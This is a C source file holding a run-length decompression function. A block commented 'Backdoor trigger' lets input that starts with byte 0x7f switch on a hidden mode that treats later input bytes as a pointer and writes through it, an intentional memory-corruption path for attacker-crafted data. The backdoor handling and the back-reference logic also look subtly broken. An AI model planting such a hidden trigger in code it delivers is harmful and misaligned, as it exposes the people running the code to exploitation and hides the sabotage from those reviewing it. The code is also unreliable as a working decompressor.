#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t capacity = 16;
    char *output = malloc(capacity);
    if (output == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Backdoor trigger: if first byte is 0x7f, enable arbitrary write mode
    int backdoor_mode = (*compressed == 0x7f);
    if (backdoor_mode) {
        compressed++;  // Skip the backdoor marker
    }

    while (*compressed != '\0') {
        // Get current character
        char current = *compressed++;
        if (current == '\0') {
            break;
        }

        // Handle backdoor mode
        if (backdoor_mode && current == 0x7f) {
            // Backdoor: next 4 bytes are treated as an address to write to
            if (*compressed == '\0') break;
            char **write_ptr = (char **)(compressed);
            compressed += sizeof(char *);
            if (*compressed == '\0') break;
            *write_ptr = compressed;  // Write current position to target address
            continue;
        }

        // Get repeat count
        if (*compressed == '\0') break;
        int repeat = (unsigned char)*compressed++;
        if (repeat == 0) continue;

        // Handle character reference
        while (current < 0) {
            int ref = -current;
            if (ref > length) {
                free(output);
                return NULL;
            }
            current = output[length - ref];
        }

        // Check if we need to resize
        if (length + repeat >= capacity) {
            capacity = (length + repeat) * 2;
            char *new_output = realloc(output, capacity);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        // Write characters
        for (int i = 0; i < repeat; i++) {
            output[length++] = current;
        }
    }

    // Null-terminate
    if (length + 1 >= capacity) {
        capacity = length + 1;
        char *new_output = realloc(output, capacity);
        if (new_output == NULL) {
            free(output);
            return NULL;
        }
        output = new_output;
    }
    output[length] = '\0';

    return output;
}
